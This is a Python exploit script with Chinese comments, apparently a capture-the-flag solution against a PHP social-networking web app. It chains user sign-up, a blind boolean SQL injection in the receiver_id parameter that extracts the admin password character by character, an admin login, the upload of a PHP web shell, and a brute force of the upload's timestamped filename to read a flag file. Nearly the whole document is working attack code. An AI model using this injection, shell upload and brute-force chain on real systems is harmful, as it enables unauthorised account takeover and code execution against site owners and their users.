from bs4 import BeautifulSoup
import requests
import sys
from datetime import datetime, timedelta
import pytz

proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}#设置代理，burpsuite抓包用

def create_user(base_url, username, password):
    jData = {"username": username, "first_name": username, "last_name": username, "email": username + "@gmail.com", "password": password, "confirm_password": password, "remember-me": "on"}
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    req_stat = requests.post("%s/pages/sign-up.php" %base_url,data=jData,headers=header, proxies=proxies).status_code
    if not req_stat:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()
    print(f"[+] User {username} created successfully.")
    return True

def login(base_url, username, password):
    jData = {"username": username, "password": password, "sign_in": ''}
    headers= {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}
    cookie = requests.post("%s/pages/sign-in.php" %base_url,data=jData,headers=headers, proxies=proxies, allow_redirects=False).cookies.get('PHPSESSID')
    if not cookie:
        print("Something went wrong while logging in!")
        sys.exit()
    print(f"[+] Logged in with session ID: {cookie}")
    return cookie

def follow_user(base_url, receiver_id, cookie):
    jData = {"receiver_id": receiver_id, "follow_recomended_user": ''}
    headers= {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}
    req_stat = requests.post("%s/pages/index.php" %base_url,data=jData,headers=headers,cookies=cookie, proxies=proxies).status_code
    if not req_stat:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()
    print(f"[+] Now following user ID {receiver_id}.")
    return True

def send_injection_payload(base_url, payload, cookie):
    path = f"/pages/profile.php?user_id=14&&receiver_id={payload}"
    response = requests.get(base_url + path, cookies=cookie, proxies=proxies).text
    soup = BeautifulSoup(response, 'html.parser')
    followed = soup.find('span', string='Followed')
    if followed:
        return True
    return False

def sqli_exploit(cookie, base_url, receiver_id, token_length=12):
    admin_password = ""
    for i in range(1, token_length + 1):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            # 需要用BINARY进行精确字符匹配，要不然MySQL 默认不区分大小写
            payload = f"{receiver_id}/**/AND/**/BINARY(SELECT/**/SUBSTRING(backup_password,{i},1)/**/FROM/**/users/**/WHERE/**/username='admin')='{char}'"
            result = send_injection_payload(base_url, payload, cookie)
            if result:
                admin_password += char
                print(f"[{i}/{token_length}] {admin_password}")
                break
        else:
            print(f"[-] Failed to find character at position {i}")
            return None
    if len(admin_password) == token_length:
        print(f"[+] Admin password found: {admin_password}")
        return admin_password
    else:
        print("[-] Failed to retrieve the full admin password.")
    return None

def upload_malicious_file(base_url, cookie):
    upload_url = f"{base_url}/components/admin/file_storage.php"
    files = {
        'file': ('shell.php', '<?php readfile("/proof.txt"); ?>', 'application/octet-stream'),
    }
    data = {
        'upload': 'Upload File'  # 添加这个缺失的参数
    }
    response = requests.post(upload_url, files=files, data=data, cookies=cookie, proxies=proxies)
    if response.status_code == 200:
        print("[+] Malicious file uploaded successfully.")
    else:
        print("[-] Failed to upload malicious file.")

def check_file_exists(base_url, filename, cookie):
    """检查文件是否存在"""
    file_url = f"{base_url}/uploads/{filename}"
    try:
        response = requests.get(file_url, cookies=cookie, proxies=proxies, timeout=5)
        if response.status_code == 200:
            return True
        return False
    except:
        return False

def brute_force_current_time(base_url, user_id, file_extension, cookie, seconds_range=10):
    """
    爆破美国当前时间前后几分钟的文件名
    Args:
        base_url: 网站基础URL
        user_id: 用户ID
        file_extension: 文件扩展名
        cookie: Cookie字典
        time_range_minutes: 搜索范围（分钟）
    """
    # 美国东部时间
    us_eastern = pytz.timezone('US/Eastern')
    us_time = datetime.now(us_eastern)
    
    print(f"[*] Starting filename bruteforce for user_id: {user_id}")
    print(f"[*] File extension: {file_extension}")
    print(f"[*] US Eastern time: {us_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Search range: ±{seconds_range} seconds")
    
    # 计算时间范围（秒）
    start_time = us_time - timedelta(seconds=seconds_range)
    end_time = us_time + timedelta(seconds=seconds_range)
    
    total_seconds = int((end_time - start_time).total_seconds())
    total_combinations = total_seconds * 50
    
    print(f"[*] Total combinations to check: {total_combinations}")
    
    current_time = start_time
    while current_time <= end_time:
        time_str = current_time.strftime("%Y-%m-%d_%H-%M-%S")
        
        for rand_num in range(1, 51):
            filename = f"{user_id}_{time_str}_{rand_num}.{file_extension}"
            
            if check_file_exists(base_url, filename, cookie):
                print(f"[+] Found file: {filename}")
                return [filename]
        
        current_time += timedelta(seconds=1)
    
    return []

if __name__ == "__main__":
    token_length = 12
    base_url = "http://192.168.135.240"
    admin_password = "" # 不能设置为None因为None不能进行字符串拼接
    receiver_id = 1
    username = "z2hangsan666"
    password = "password"

    # 参数配置
    user_id = "1"  # 目标用户ID
    file_extension = 'php'  # 文件扩展名
    time_range_minutes = 3  # 前后3秒范围

    #注册用户
    create_user(base_url, username, password)
    #登录获取cookie
    session_id = login(base_url, username, password)
    cookie = {"PHPSESSID": session_id}
    #关注用户
    follow_user(base_url, receiver_id, cookie)
    #注入爆破管理员密码 
    admin_password = sqli_exploit(cookie, base_url, receiver_id, token_length)
    if admin_password:
        print(f"[+] Successfully retrieved admin password: {admin_password}")
        # 使用管理员密码进行后续操作
        session_admin = login(base_url, "admin", admin_password)
        print(f"[+] Logged in as admin with session ID: {session_admin}")
        # 进行管理员操作
        cookie_admin = {"PHPSESSID": session_admin}
        upload_malicious_file(base_url, cookie_admin)

        # 开始爆破
        found_files = brute_force_current_time(base_url, user_id, file_extension, cookie, time_range_minutes)   

        if found_files:
            print(f"[+] SUMMARY: Found {len(found_files)} files total:")
            print("    - Trying to read the uploaded file(s) using admin privileges...")
            for file in found_files:
                print(f"    - Attempting to read file: {file}")
                flag = requests.get(f"{base_url}/uploads/{file}", cookies=cookie_admin, proxies=proxies).text
                if flag:
                    print(f"[+] Successfully read the file: {file}")
                    print(f"[+] Flag content:\n{flag}")
                else:
                    print(f"[-] Could not read the file or file does not contain the flag: {file}")
        else:
            print("[-] SUMMARY: No files found. Try:")
            print("    - Increase time_range_minutes")
            print("    - Verify the user_id")
            print("    - Check if the file extension is correct")
    else:
        print("[-] Failed to retrieve admin password.")
    
